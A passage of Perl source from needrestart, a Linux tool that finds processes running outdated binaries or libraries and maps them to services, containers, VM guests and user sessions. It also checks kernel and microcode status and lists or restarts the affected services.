    my $rc = '/etc/init.d/'.shift;

    # ignore upstart-job magic
    if(-l $rc && readlink($rc) eq '/lib/init/upstart-job') {
        print STDERR "$LOGPREF ignoring $rc since it is a converted upstart job\n" if($nrconf{verbosity} > 1);
        return ();
    }

    open(HLSB, '<', $rc) || die "Can't open $rc: $!\n";
    my %lsb;
    my $found_lsb;
    my %chkconfig;
    my $found_chkconfig;
    while(my $line = <HLSB>) {
        chomp($line);

        unless($found_chkconfig) {
            if($line =~ /^# chkconfig: (\d+) /) {
                $chkconfig{runlevels} = $1;
                $found_chkconfig++
            }
        }
        elsif($line =~ /^# (\S+): (.+)$/) {
            $chkconfig{lc($1)} = $2;
        }

        unless($found_lsb) {
            $found_lsb++ if($line =~ /^### BEGIN INIT INFO/);
            next;
        }
        elsif($line =~ /^### END INIT INFO/) {
            last;
        }

        $lsb{lc($1)} = $2 if($line =~ /^# ([^:]+):\s+(.+)$/);
    }

    # convert chkconfig tags to LSB tags
    if($found_chkconfig && !$found_lsb) {
        print STDERR "$LOGPREF $rc is missing LSB tags, found chkconfig tags instead\n" if($nrconf{verbosity} > 1);

        $found_lsb++;
        $lsb{pidfiles} = [$chkconfig{pidfile}];
        $lsb{q(default-start)} = $chkconfig{runlevels};
    }

    unless($found_lsb) {
        print STDERR "WARNING: $rc has no LSB tags!\n" unless(%lsb);
        return ();
    }

    # pid file heuristic
    unless(exists($lsb{pidfiles})) {
        my $found = 0;
        my %pidfiles;
        while(my $line = <HLSB>) {
            if($line =~ m@(\S*/run/[^/]+.pid)@ && -r $1) {
                $pidfiles{$1}++;
                $found++;
            }
        }
        $lsb{pidfiles} = [keys %pidfiles] if($found);
    }
    close(HLSB);

    return %lsb;
}

print STDERR "$LOGPREF systemd detected\n" if($nrconf{verbosity} > 1 && $is_systemd);
print STDERR "$LOGPREF vm detected\n" if($nrconf{verbosity} > 1 && $is_vm);
print STDERR "$LOGPREF container detected\n" if($nrconf{verbosity} > 1 && $is_container);

sub systemd_refuse_restart {
    my $svc = shift;

    my $systemctl = nr_fork_pipe($nrconf{verbosity} > 1, qq(systemctl), qq(show), qq(--property=RefuseManualStop), $svc);
    my $ret = <$systemctl>;
    close($systemctl);

    if($ret && $ret =~ /^RefuseManualStop=yes/) {
        print STDERR "$LOGPREF systemd refuses restarts of $svc\n" if($nrconf{verbosity} > 1);
        return 1;
    }

    return 0;
}

my @systemd_restart;
sub restart_cmd($) {
    my $rc = shift;

    my $restcmd = "$nrconf{restart_d}/$rc";
    if(-x $restcmd) {
        print STDERR "$LOGPREF using restart.d file $rc\n" if($nrconf{verbosity} > 1);
        ($restcmd);
    }
    elsif($rc =~ /.+\.service$/) {
        if($nrconf{systemctl_combine}) {
            push(@systemd_restart, $rc);
            ();
        }
        else {
            (qw(systemctl restart), $rc);
        }
    }
    else {
        if($is_systemd) {
            if($nrconf{systemctl_combine}) {
                push(@systemd_restart, qq($rc.service));
                ();
            }
            else {
                (qw(systemctl restart), qq($rc.service));
            }
        }
        elsif($is_runit && -d qq(/etc/sv/$rc)) {
            if(-e qq(/etc/service/$rc)) {
                (qw(sv restart), $rc);
            }
            else {
                (q(service), $rc, q(restart));
            }
        }
        else {
            (q(service), $rc, q(restart));
        }
    }
}

# map UID to username (cached)
my %uidcache;
sub uid2name($) {
    my $uid = shift;

    return $uidcache{$uid} if(exists($uidcache{$uid}));

    return $uidcache{$uid} = getpwuid($uid) || $uid;
}


my %nagios = (
    # kernel
    kstr => q(unknown),
    kret => 3,
    kperf => q(U),

    # uCode
    mstr => q(unknown),
    mret => 3,
    mperf => q(U),

    # services
    sstr => q(unknown),
    sret => 3,
    sperf => q(U),

    # sessions
    ustr => q(unknown),
    uret => 3,
    uperf => q(U),
 );
print "NEEDRESTART-VER: $NeedRestart::VERSION\n" if($opt_b && !$opt_p && !$opt_o);

my %ometric_kernel_values = (
    kresult => q(unknown),
    krunning => q(unknown),
    kexpected => q(unknown),
);

my %restart;
my %sessions;
my @guests;
my @easy_hints;

if(defined($opt_l)) {
    my @ign_pids=($$, getppid());

    # inspect only pids
    my $ptable = nr_ptable();

    # find session parent
    sub findppid($@) {
        my $uid = shift;
        my ($pid, @pids) = @_;

        if($ptable->{$pid}->{ppid} == 1) {
            return $pid
                if($ptable->{$pid}->{uid} == $uid);

            return undef;
        }

        foreach my $pid (@pids) {
            my $ppid = &findppid($uid, $pid);

            return $ppid if($ppid);
        }

        return $pid;
    }

    $ui->progress_prep(scalar keys %$ptable, __ 'Scanning processes...');
    my %stage2;
    for my $pid (sort {$a <=> $b} keys %$ptable) {
        $ui->progress_step;

        # user-mode: skip foreign processes
        next if($uid && $ptable->{$pid}->{uid} != $uid);

        # skip myself
        next if(grep {$pid == $_} @ign_pids);

        my $restart = 0;
        my $exe = nr_readlink($pid);

        # ignore kernel threads
        next unless(defined($exe));

        # orphaned binary
        $restart++ if (defined($exe) && $exe =~ s/ \(deleted\)$//);  # Linux
        $restart++ if (defined($exe) && $exe =~ s/^\(deleted\)//);   # Linux VServer
        print STDERR "$LOGPREF #$pid uses obsolete binary $exe\n" if($restart && $nrconf{verbosity} > 1);

        # ignore blacklisted binaries
        next if(grep { $exe =~ /$_/; } @{$nrconf{blacklist}});

        # read file mappings (Linux 2.0+)
        unless($restart) {
            if(open(HMAP, '<', "/proc/$pid/maps")) {
                while(<HMAP>) {
                    chomp;
                    my ($maddr, $mperm, $moffset, $mdev, $minode, $path) = split(/\s+/, $_, 6);

                    # skip special handles and non-executable mappings
                    next unless(defined($path) && $minode != 0 && $path ne '' && $mperm =~ /x/);

                    # skip special device paths
                    next if(scalar grep { $path =~ /$_/; } @{$nrconf{blacklist_mappings}});

                    # removed executable mapped files
                    if($path =~ s/ \(deleted\)$// ||  # Linux
                       $path =~ s/^\(deleted\)//) {   # Linux VServer
                        print STDERR "$LOGPREF #$pid uses deleted $path\n" if($nrconf{verbosity} > 1);
                        $restart++;
                        last;
                    }

                    # check for outdated lib mappings
                    unless($nrconf{skip_mapfiles} == 1) {
                        $maddr =~ s/^0+([^-])/$1/;
                        $maddr =~ s/-0+(.)/-$1/;
                        my @paths = ("/proc/$pid/map_files/$maddr", "/proc/$pid/root/$path");
                        my ($testp) = grep { -e $_; } @paths;
                        unless($testp) {
                            unless($nrconf{skip_mapfiles} == -1) {
                                print STDERR "$LOGPREF #$pid uses non-existing $path\n" if($nrconf{verbosity} > 1);
                                $restart++;
                                last;
                            }
                            next;
                        }

                        # get on-disk info
                        my ($sdev, $sinode) = stat($testp);
                        my @sdevs = (
                            # glibc gnu_dev_* definition from sysmacros.h
                            sprintf("%02x:%02x", (($sdev >> 8) & 0xfff) | (($sdev >> 32) & ~0xfff), (($sdev & 0xff) | (($sdev >> 12) & ~0xff))),
                            # Traditional definition of major(3) and minor(3)
                            sprintf("%02x:%02x", $sdev >> 8, $sdev & 0xff),

                            # kFreeBSD: /proc/<pid>/maps does not contain device IDs
                            qq(00:00)
                            );

                        # Don't compare device numbers on anon filesystems
                        # w/o a backing device (like OpenVZ's simfs).
                        my $major = (($sdev >> 8) & 0xfff) | (($sdev >> 32) & ~0xfff);
                        $mdev = "00:00"
                            if ($major == 0 || $major == 144 || $major == 145 || $major == 146);

                        # compare maps content vs. on-disk
                        unless($minode eq $sinode && ((grep {$mdev eq $_} @sdevs) ||
                                                      # BTRFS breaks device ID mapping completely...
                                                      # ignoring unnamed device IDs for now
                                                      $mdev =~ /^00:/)) {
                            print STDERR "$LOGPREF #$pid uses obsolete $path\n" if($nrconf{verbosity} > 1);
                            $restart++;
                            last;
                        }
                    }
                }
                close(HMAP);
            }
            else {
                print STDERR "$LOGPREF #$pid could not open maps: $!\n" if($nrconf{verbosity} > 1);
            }
        }

        unless($restart || !$nrconf{interpscan}) {
            $restart++ if(needrestart_interp_check($nrconf{verbosity} > 1, $pid, $exe, $nrconf{blacklist_interp}, $opt_t));
        }

        # handle containers (LXC, docker, etc.)
        next if($restart && needrestart_cont_check($nrconf{verbosity} > 1, $pid, $exe));

        # restart needed?
        next unless($restart);

        # handle user sessions
        if($ptable->{$pid}->{ttydev} ne '' && (!$is_systemd || !$nrconf{has_pam_systemd})) {
            my $ttydev = realpath( $ptable->{$pid}->{ttydev} );
            print STDERR "$LOGPREF #$pid part of user session: uid=$ptable->{$pid}->{uid} sess=$ttydev\n" if($nrconf{verbosity} > 1);
            push(@{ $sessions{ $ptable->{$pid}->{uid} }->{ $ttydev }->{ $ptable->{$pid}->{fname} } }, $pid);

            # add session processes to stage2 only in user mode
            $stage2{$pid} = $exe if($uid);

            next;
        }

        # find parent process
        my $ppid = $ptable->{$pid}->{ppid};
        if($ppid != $pid && $ppid > 1 && !$uid) {
            print STDERR "$LOGPREF #$pid is a child of #$ppid\n" if($nrconf{verbosity} > 1);

            if($uid && $ptable->{$ppid}->{uid} != $uid) {
                print STDERR "$LOGPREF #$ppid is a foreign process\n" if($nrconf{verbosity} > 1);
                $stage2{$pid} = $exe;
            }
            else {
                unless(exists($stage2{$ppid})) {
                    my $pexe = nr_readlink($ppid);
                    # ignore kernel threads
                    next unless(defined($pexe));

                    $stage2{$ppid} = $pexe;
                }
            }
        }
        else {
            print STDERR "$LOGPREF #$pid is not a child\n" if($nrconf{verbosity} > 1 && !$uid);
            $stage2{$pid} = $exe;
        }
    }
    $ui->progress_fin;

    if(scalar keys %stage2 && !$uid) {
        $ui->progress_prep(scalar keys %stage2, __ 'Scanning candidates...');
        PIDLOOP: foreach my $pid (sort {$a <=> $b} keys %stage2) {
            $ui->progress_step;

            # skip myself
            next if(grep {$pid == $_} @ign_pids);

            my $exe = nr_readlink($pid);
            $exe =~ s/ \(deleted\)$//;  # Linux
            $exe =~ s/^\(deleted\)//;   # Linux VServer
            print STDERR "$LOGPREF #$pid exe => $exe\n" if($nrconf{verbosity} > 1);

            # try to find interpreter source file
            ($exe) = (needrestart_interp_source($nrconf{verbosity} > 1, $pid, $exe), $exe);

            # ignore blacklisted binaries
            next if(grep { $exe =~ /$_/; } @{$nrconf{blacklist}});

            if($is_systemd) {
                # systemd manager
                if($pid == 1 && $exe =~ m@^(/usr)?/lib/systemd/systemd@) {
                    print STDERR "$LOGPREF #$pid is systemd manager\n" if($nrconf{verbosity} > 1);
                    $restart{q(systemd-manager)}++;
                    next;
                }

                # get unit name from /proc/<pid>/cgroup
                if(open(HCGROUP, qq(/proc/$pid/cgroup))) {
                    my ($rc) = map {
                        chomp;
                        my ($id, $type, $value) = split(/:/);
                        if($id != 0 && $type ne q(name=systemd)) {
                            ();
                        }
                        else {
                            if($value =~ m@/user-(\d+)\.slice/session-(\d+)\.scope@) {
                                print STDERR "$LOGPREF #$pid part of user session: uid=$1 sess=$2\n" if($nrconf{verbosity} > 1);
                                push(@{ $sessions{$1}->{"session #$2"}->{ $ptable->{$pid}->{fname} } }, $pid);
                                next;
                            }
                            if($value =~ m@/user\@(\d+)\.service@) {
                                print STDERR "$LOGPREF #$pid part of user manager service: uid=$1\n" if($nrconf{verbosity} > 1);
                                push(@{ $sessions{$1}->{'user manager service'}->{ $ptable->{$pid}->{fname} } }, $pid);
                                next;
                            }
                                if($value =~ m@/machine.slice/machine.qemu(.*).scope@) {
                                for my $cmdlineidx (0 .. $#{$ptable->{$pid}->{cmdline}} ) {
                                        if ( ${$ptable->{$pid}->{cmdline}}[$cmdlineidx] eq "-name") {
                                                foreach ( split(/,/, ${$ptable->{$pid}->{cmdline}}[$cmdlineidx+1]) ) {
                                                        if ( index($_, "guest=") == 0 ) {
                                                                my @namearg = split(/=/, $_, 2);
                                                                if ($#{namearg} == 1) {
                                                                        print STDERR "$LOGPREF #$pid detected as VM guest '$namearg[1]' in group '$value'\n" if($nrconf{verbosity} > 1);
                                                                        push(@guests, __x("'{name}' with pid {pid}", name => $namearg[1], pid=>$pid) );
                                                                }
                                                                next PIDLOOP;
                                                        }
                                                }
                                        }
                                }
                                print STDERR "$LOGPREF #$pid detected as VM guest with unknown name in group '$value'\n" if($nrconf{verbosity} > 1);
                                push(@guests, __x("'Unkown VM' with pid {pid}", pid=>$pid) );
                                next;
                            }
                            elsif($value =~ m@/([^/]+\.service)$@) {
                                ($1);
                            }
                            else {
                                print STDERR "$LOGPREF #$pid unexpected cgroup '$value'\n" if($nrconf{verbosity} > 1);
                                ();
                            }
                        }
                    } <HCGROUP>;
                    close(HCGROUP);

                    if($rc) {
                        print STDERR "$LOGPREF #$pid is $rc\n" if($nrconf{verbosity} > 1);
                        $restart{$rc}++;
                        next;
                    }
                }

                # did not get the unit name, yet - try systemctl status
                print STDERR "$LOGPREF /proc/$pid/cgroup: $!\n" if($nrconf{verbosity} > 1 && $!);
                print STDERR "$LOGPREF trying systemctl status\n" if($nrconf{verbosity} > 1);
                my $systemctl = nr_fork_pipe($nrconf{verbosity} > 1, qq(systemctl), qq(-n), qq(0), qq(--full), qq(status), $pid);
                my $ret = <$systemctl>;
                close($systemctl);

                if(defined($ret) && $ret =~ /([^\s]+\.service)( |$)/) {
                    my $s = $1;
                    print STDERR "$LOGPREF #$pid is $s\n" if($nrconf{verbosity} > 1);
                    $restart{$s}++;
                    $s =~ s/\.service$//;
                    delete($restart{$s});
                    next;
                }
            }
            else {
                # sysv init
                if($pid == 1 && $exe =~ m@^/sbin/init@) {
                    print STDERR "$LOGPREF #$pid is sysv init\n" if($nrconf{verbosity} > 1);
                    $restart{q(sysv-init)}++;
                    next;
                }
            }

            my $pkg;
            foreach my $hook (nsort <$nrconf{hook_d}/*>) {
                print STDERR "$LOGPREF #$pid running $hook\n" if($nrconf{verbosity} > 1);

                my $found = 0;
                my $prun = nr_fork_pipe($nrconf{verbosity} > 1, $hook, ($nrconf{verbosity} > 1 ? qw(-v) : ()), $exe);
                my @nopids;
                while(<$prun>) {
                    chomp;
                    my @v = split(/\|/);

                    if($v[0] eq 'PACKAGE' && $v[1]) {
                        $pkg = $v[1];
                        print STDERR "$LOGPREF #$pid package: $v[1]\n" if($nrconf{verbosity} > 1);
                        next;
                    }

                    if($v[0] eq 'RC') {
                        my %lsb = parse_lsbinit($v[1]);

                        unless(%lsb && exists($lsb{'default-start'})) {
                            # If the script has no LSB tags we consider to call it later - they
                            # are broken anyway.
                            print STDERR "$LOGPREF no LSB headers found at $v[1]\n" if($nrconf{verbosity} > 1);
                            push(@nopids, $v[1]);
                        }
                        # In the run-levels S and 1 no daemons are being started (normally).
                        # We don't call any rc.d script not started in the current run-level.
                        elsif($lsb{'default-start'} =~ /$runlevel/) {
                            # If a pidfile has been found, try to look for the daemon and ignore
                            # any forked/detached childs (just a heuristic due Debian Bug#721810).
                            if(exists($lsb{pidfiles})) {
                                foreach my $pidfile (@{ $lsb{pidfiles} }) {
                                    open(HPID, '<', "$pidfile") || next;
                                    my $p = <HPID>;
                                    close(HPID);

                                    if(int($p) == $pid) {
                                        print STDERR "$LOGPREF #$pid has been started by $v[1] - triggering\n" if($nrconf{verbosity} > 1);
                                        $restart{$v[1]}++;
                                        $found++;
                                        last;
                                    }
                                }
                            }
                            else {
                                print STDERR "$LOGPREF no pidfile reference found at $v[1]\n" if($nrconf{verbosity} > 1);
                                push(@nopids, $v[1]);
                            }
                        }
                        else {
                            print STDERR "$LOGPREF #$pid rc.d script $v[1] should not start in the current run-level($runlevel)\n" if($nrconf{verbosity} > 1);
                        }
                    }
                }

                # No perfect hit - call any rc scripts instead.
                print STDERR "$LOGPREF #$pid running $hook no perfect hit found $found pids $#nopids\n" if($nrconf{verbosity} > 1);
                if(!$found && $#nopids > -1) {
                    foreach my $rc (@nopids) {
                        if($is_systemd && exists($restart{"$rc.service"})) {
                            print STDERR "$LOGPREF #$pid rc.d script $rc seems to be superseded by $rc.service\n" if($nrconf{verbosity} > 1);
                        }
                        else {
                            $restart{$rc}++;
                        }
                    }
                    $found++;
                }

                last if($found);
            }
        }
        $ui->progress_fin;
    }

    # List user's processes in user-mode
    if($uid && scalar %stage2) {
        my %fnames;
        foreach my $pid (keys %stage2) {
            push(@{$fnames{ $ptable->{$pid}->{fname} }}, $pid);
        }

        if($opt_b) {
            print map { "NEEDRESTART-PID: $_=".join(',', @{ $fnames{$_} })."\n"; } nsort keys %fnames;
        }
        else {
            $ui->notice(__ 'Your outdated processes:');
            $ui->notice(join(', ',map { $_.'['.join(', ', @{ $fnames{$_} }).']';  } nsort keys %fnames));
        }
    }
}

# Apply rc/service blacklist
foreach my $rc (keys %restart) {
    next unless(scalar grep { $rc =~ /$_/; } @{$nrconf{blacklist_rc}});

    print STDERR "$LOGPREF $rc is blacklisted -> ignored\n" if($nrconf{verbosity} > 1);
    delete($restart{$rc});
}

# Skip kernel stuff within container
if($is_container || needrestart_cont_check($nrconf{verbosity} > 1, 1, nr_readlink(1), 1)) {
    print STDERR "$LOGPREF inside container, skipping kernel checks\n" if($nrconf{verbosity} > 1);
    $opt_k = undef;
}

# Skip uCode stuff within container or vm
if($is_container || $is_vm || needrestart_cont_check($nrconf{verbosity} > 1, 1, nr_readlink(1), 1)) {
    print STDERR "$LOGPREF inside container or vm, skipping microcode checks\n" if($nrconf{verbosity} > 1);
    $opt_w = undef;
}

my ($ucode_result, %ucode_vars) = (NRM_UNKNOWN);
if(defined($opt_w)) {
    ($ucode_result, %ucode_vars) = ($nrconf{ucodehints} || $opt_w ? nr_ucode_check($nrconf{verbosity} > 1, $ui) : ());
}

if(defined($opt_k)) {
    my ($kresult, %kvars) = ($nrconf{kernelhints} || $opt_b ? nr_kernel_check($nrconf{verbosity} > 1, $nrconf{kernelfilter}, $ui) : ());

    if(defined($kresult)) {
        if($opt_b) {
            unless($opt_p || $opt_o) {
            print "NEEDRESTART-KCUR: $kvars{KVERSION}\n";
            print "NEEDRESTART-KEXP: $kvars{EVERSION}\n" if(defined($kvars{EVERSION}));
            print "NEEDRESTART-KSTA: $kresult\n";
            }
            elsif ($opt_p) {
            $nagios{kstr} = $kvars{KVERSION};
            if($kresult == NRK_VERUPGRADE) {
                $nagios{kstr} .= "!=$kvars{EVERSION}";
                $nagios{kret} = $nrconf{q(nagios-status)}->{kernel};
                $nagios{kperf} = 2;
            }
            elsif($kresult == NRK_ABIUPGRADE) {
                $nagios{kret} = $nrconf{q(nagios-status)}->{kernel};
                $nagios{kperf} = 1;
            }
            elsif($kresult == NRK_NOUPGRADE) {
                $nagios{kret} = 0;
                $nagios{kperf} = 0;
            }

            if($nagios{kret} == 1) {
                $nagios{kstr} .= " (!)";
            }
            elsif($nagios{kret} == 2) {
                $nagios{kstr} .= " (!!)";
            }
        }
        elsif ($opt_o) {
            $ometric_kernel_values{kresult} = $kresult;
            $ometric_kernel_values{krunning} = $kvars{KVERSION};
            $ometric_kernel_values{kexpected} = $kvars{EVERSION};
        }
        }
        else {
            if($kresult == NRK_NOUPGRADE) {
            unless($opt_m eq 'e') {
                $ui->vspace();
                $ui->notice(($kvars{ABIDETECT} ? __('Running kernel seems to be up-to-date.') : __('Running kernel seems to be up-to-date (ABI upgrades are not detected).')))
            }
            }
            elsif($kresult == NRK_ABIUPGRADE) {
                push(@easy_hints, __ 'an outdated kernel image') if($opt_m eq 'e');

                if($nrconf{kernelhints} < 0) {
            $ui->vspace();
                    $ui->notice(__x(
                                    'The currently running kernel version is {kversion} and there is an ABI compatible upgrade pending.',
                                    kversion => $kvars{KVERSION},
                                ));
                }
                else {
                    $ui->announce_abi(%kvars);
                }
            }
            elsif($kresult == NRK_VERUPGRADE) {
                push(@easy_hints, __ 'an outdated kernel image') if($opt_m eq 'e');

                if($nrconf{kernelhints} < 0) {
            $ui->vspace();
                    $ui->notice(__x(
                                    'The currently running kernel version is {kversion} which is not the expected kernel version {eversion}.',
                                    kversion => $kvars{KVERSION},
                                    eversion => $kvars{EVERSION},
                                ));
                }
                else {
                    $ui->announce_ver(%kvars);
                }
            }
            else {
            $ui->vspace();
            $ui->notice(__ 'Failed to retrieve available kernel versions.');
            }
        }
    }
}

if($opt_w) {
        if($opt_b) {
        unless($opt_p || $opt_o) {
            print "NEEDRESTART-UCSTA: $ucode_result\n";
            if($ucode_result != NRM_UNKNOWN) {
                print "NEEDRESTART-UCCUR: $ucode_vars{CURRENT}\n";
                print "NEEDRESTART-UCEXP: $ucode_vars{AVAIL}\n";
            }
            }
        else {
            if($ucode_result == NRM_OBSOLETE) {
                $nagios{mstr} = "OBSOLETE";
                $nagios{mret} = $nrconf{q(nagios-status)}->{ucode};
                $nagios{mperf} = 1;
            }
            elsif($ucode_result == NRM_CURRENT) {
                $nagios{mstr} = "CURRENT";
                $nagios{mret} = 0;
                $nagios{mperf} = 0;
            }

            if($nagios{mret} == 1) {
                $nagios{mstr} .= " (!)";
            }
            elsif($nagios{mret} == 2) {
                $nagios{mstr} .= " (!!)";
            }
        }
        }
        else {
            if($ucode_result == NRM_CURRENT) {
            unless($opt_m eq 'e') {
                $ui->vspace();
                $ui->notice(__('The processor microcode seems to be up-to-date.'));
            }
            }
            elsif($ucode_result == NRM_OBSOLETE) {
            push(@easy_hints, __ 'outdated processor microcode') if($opt_m eq 'e');

            if($nrconf{ucodehints} < 0) {
                $ui->vspace();
                $ui->notice(__x(
                    'The currently running processor microcode revision is {crev} which is not the expected microcode revision {erev}.',
                    crev => $ucode_vars{CURRENT},
                    erev => $ucode_vars{AVAIL},
                ));
            }
            elsif($nrconf{ucodehints}) {
                $ui->announce_ucode(%ucode_vars);
            }
            }
            else {
            $ui->vspace();
            $ui->notice(__ 'Failed to check for processor microcode upgrades.');
            }
        }
}

if(defined($opt_l) && !$uid) {
    ## SERVICES
    $ui->vspace();
    unless(scalar %restart) {
        $ui->notice(__ 'No services need to be restarted.') unless($opt_b || $opt_m eq 'e');
        if($opt_p) {
            $nagios{sstr} = q(none);
            $nagios{sret} = 0;
            $nagios{sperf} = 0;
        }
    }
    else {
        if($opt_m eq 'e' && $opt_r ne 'i') {
            push(@easy_hints, __ 'outdated binaries');
        }
        elsif($opt_b || $opt_r ne 'i') {
            my @skipped_services;
            my @refused_services;

            $ui->notice(__ 'Services to be restarted:') if($opt_r eq 'l');
            $ui->notice(__ 'Restarting services...') if($opt_r eq 'a');
            if($opt_p) {
            $nagios{sstr} = (scalar keys %restart);
            $nagios{sret} = $nrconf{q(nagios-status)}->{services};
            $nagios{sperf} = (scalar keys %restart);

            if($nagios{sret} == 1) {
                $nagios{sstr} .= " (!)";
            }
            elsif($nagios{sret} == 2) {
                $nagios{sstr} .= " (!!)";
            }
        }

        my @sorted_override_rc_keys = sort keys %{$nrconf{override_rc}};

            foreach my $rc (sort { lc($a) cmp lc($b) } keys %restart) {
                # always combine restarts in one systemctl command
                local $nrconf{systemctl_combine} = 1 unless($opt_r eq 'l');

                if($opt_b) {
                    print "NEEDRESTART-SVC: $rc\n" unless($opt_p || $opt_o);
                    next;
                }

                # record service which can not be restarted
                if($is_systemd && systemd_refuse_restart($rc)) {
                    push(@refused_services, $rc);
                    next;
                }

                # don't restart greylisted services...
                my $restart = !$nrconf{defno};
                foreach my $re (@sorted_override_rc_keys) {
                    next unless($rc =~ /$re/);

                    $restart = $nrconf{override_rc}->{$re};
                    last;
                }
                # ...but complain about them
                unless($restart) {
                    push(@skipped_services, $rc);
                    next;
                }

                my @cmd = restart_cmd($rc);
                next unless($#cmd > -1);

                $ui->command(join(' ', '', @cmd));
                $ui->runcmd(sub {
                    system(@cmd) if($opt_r eq 'a');
                            });
            }

            unless($#systemd_restart == -1) {
                my @cmd = (qq(systemctl), qq(restart), @systemd_restart);
                $ui->command(join(' ', '', @cmd));
                $ui->runcmd(sub {
                    system(@cmd) if($opt_r eq 'a');
                            });
            }

            @systemd_restart = ();
            if($#skipped_services > -1) {
                $ui->vspace();
                $ui->notice(__ 'Service restarts being deferred:');
                foreach my $rc (sort @skipped_services) {
                    my @cmd = restart_cmd($rc);
                    $ui->command(join(' ', '', @cmd)) if($#cmd > -1);
                }

                unless($#systemd_restart == -1) {
                    my @cmd = (qq(systemctl), qq(restart), @systemd_restart);
                    $ui->command(join(' ', '', @cmd));
                }
            }

            # report services restarts refused by systemd
            if($#refused_services > -1) {
                $ui->vspace();
                $ui->notice(__ 'Service restarts being refused by systemd:');
                foreach my $rc (sort @refused_services) {
                    $ui->command(qq( $rc));
                }
            }
        }
        else {
            my $o = 0;
            my @skipped_services = keys %restart;

            # filter service units which are refused to be restarted
            my @refused_services;
            my %rs = map {
                my $rc = $_;

                if($is_systemd) {
                    if(systemd_refuse_restart($rc)) {
                        push(@refused_services, $rc);
                        @skipped_services = grep { $_ ne $rc; } @skipped_services;
                        ();
                    }
                    else {
                        ($rc => 1);
                    }
                }
                else {
                    ($rc => 1);
                }
            } keys %restart;

            $ui->notice(__ 'Restarting services...');
            $ui->query_pkgs(__('Services to be restarted:'), $nrconf{defno}, \%rs, $nrconf{override_rc},
                            sub {
                                # always combine restarts in one systemctl command
                                local $nrconf{systemctl_combine} = 1;

                                my $rc = shift;
                                @skipped_services = grep { $_ ne $rc; } @skipped_services;

                                my @cmd = restart_cmd($rc);
                                return unless($#cmd > -1);

                                $ui->command(join(' ', '', @cmd));
                                system(@cmd);
                            });

            if($#systemd_restart > -1) {
                my @cmd = (qw(systemctl restart), @systemd_restart);

                $ui->command(join(' ', '', @cmd));
                $ui->runcmd(sub {
                    system(@cmd);
                            });
            }

            @systemd_restart = ();
            if($#skipped_services > -1) {
                $ui->notice(__ 'Service restarts being deferred:');
                foreach my $rc (sort @skipped_services) {
                    my @cmd = restart_cmd($rc);
                    $ui->command(join(' ', '', @cmd)) if($#cmd > -1);
                }

                unless($#systemd_restart == -1) {
                    my @cmd = (qq(systemctl), qq(restart), @systemd_restart);
                    $ui->command(join(' ', '', @cmd));
                }
            }

            # report services restarts refused by systemd
            if($#refused_services > -1) {
                $ui->notice(__ 'Service restarts being refused by systemd:');
                foreach my $rc (sort @refused_services) {
                    $ui->command(qq( $rc));
                }
            }
        }
    }


    ## CONTAINERS
    $ui->vspace();
    @systemd_restart = ();
    my %conts = needrestart_cont_get($nrconf{verbosity} > 1);
    unless(scalar %conts) {
        $ui->notice(__ 'No containers need to be restarted.') unless($opt_b || $opt_m eq 'e');
        if($opt_p) {
            $nagios{cstr} = q(none);
            $nagios{cret} = 0;
            $nagios{cperf} = 0;
        }
    }
    else {
        if($opt_m eq 'e' && $opt_r ne 'i') {
            push(@easy_hints, __ 'outdated containers');
        }
        elsif($opt_b || $opt_r ne 'i') {
            my @skipped_containers;

            $ui->notice(__ 'Containers to be restarted:') if($opt_r eq 'l');
            $ui->notice(__ 'Restarting containers...') if($opt_r eq 'a');
            if($opt_p) {
            $nagios{cstr} = (scalar keys %conts);
            $nagios{cret} = $nrconf{q(nagios-status)}->{containers};
            $nagios{cperf} = (scalar keys %conts);

            if($nagios{cret} == 1) {
                $nagios{cstr} .= " (!)";
            }
            elsif($nagios{cret} == 2) {
                $nagios{cstr} .= " (!!)";
            }
            }

            foreach my $cont (sort { lc($a) cmp lc($b) } keys %conts) {
                if($opt_b) {
                    print "NEEDRESTART-CONT: $cont\n" unless($opt_p || $opt_o);
                    next;
                }

                # don't restart greylisted containers...
                my $restart = !$nrconf{defno};
                foreach my $re (keys %{$nrconf{override_cont}}) {
                    next unless($cont =~ /$re/);

                    $restart = $nrconf{override_cont}->{$re};
                    last;
                }
                # ...but complain about them
                unless($restart) {
                    push(@skipped_containers, $cont);
                    next;
                }

                $ui->command(join(' ', '', @{ $conts{$cont} }));
                $ui->runcmd(sub {
                    system(@{ $conts{$cont} }) if($opt_r eq 'a');
                            });
            }

            if($#skipped_containers > -1) {
                $ui->notice(__ 'Container restarts being deferred:');
                foreach my $cont (sort @skipped_containers) {
                    $ui->command(join(' ', '', @{ $conts{$cont} }));
                }
            }
        }
        else {
            my $o = 0;

            $ui->notice(__ 'Restarting containers...');
            $ui->query_conts(__('Containers to be restarted:'), $nrconf{defno}, \%conts, $nrconf{override_cont},
                             sub {
                                 my $cont = shift;
                                 $ui->command(join(' ', '', @{ $conts{$cont} }));
                                 system(@{ $conts{$cont} });
                             });
        }
    }

    ## SESSIONS
    $ui->vspace();
    # list and notify user sessions
    unless(scalar keys %sessions) {
        $ui->notice(__ 'No user sessions are running outdated binaries.') unless($opt_b || $opt_m eq 'e');
        if($opt_p) {
            $nagios{ustr} = 'none';
            $nagios{uret} = 0;
            $nagios{uperf} = 0;
        }
    }
    else {
        if($opt_m eq 'e') {
            push(@easy_hints, __ 'outdated sessions');
        }
        else {
            $ui->notice(__ 'User sessions running outdated binaries:');
        }
        if($opt_p) {
            my $count = sum map { scalar keys %{ $sessions{$_} } } keys %sessions;
            $nagios{ustr} = $count;
            $nagios{uret} = $nrconf{q(nagios-status)}->{sessions};
            $nagios{uperf} = $count;

        if($nagios{uret} == 1) {
            $nagios{ustr} .= " (!)";
        }
        elsif($nagios{uret} == 2) {
            $nagios{ustr} .= " (!!)";
        }
        }
        unless($opt_p || $opt_b) {
            foreach my $uid (sort { ncmp(uid2name($a), uid2name($b)); } keys %sessions) {
                foreach my $sess (sort keys %{ $sessions{$uid} }) {
                    my $fnames = join(', ',map { $_.'['.join(',', @{ $sessions{$uid}->{$sess}->{$_} }).']';  } nsort keys %{ $sessions{$uid}->{$sess} });
                    $ui->notice(' '.uid2name($uid)." @ $sess: $fnames") unless($opt_m eq 'e');
                    if($nrconf{sendnotify}) {
                        local %ENV;

                        $ENV{NR_UID} = $uid;
                        $ENV{NR_USERNAME} = uid2name($uid);
                        $ENV{NR_SESSION} = $sess;
                        $ENV{NR_SESSPPID} = findppid($uid, sort map { @$_; } values %{ $sessions{$uid}->{$sess} });

                        foreach my $bin (nsort <$nrconf{notify_d}/*>) {
                            next unless(-x $bin);
                            next if($bin =~ /(~|\.dpkg-[^.]+)$/);

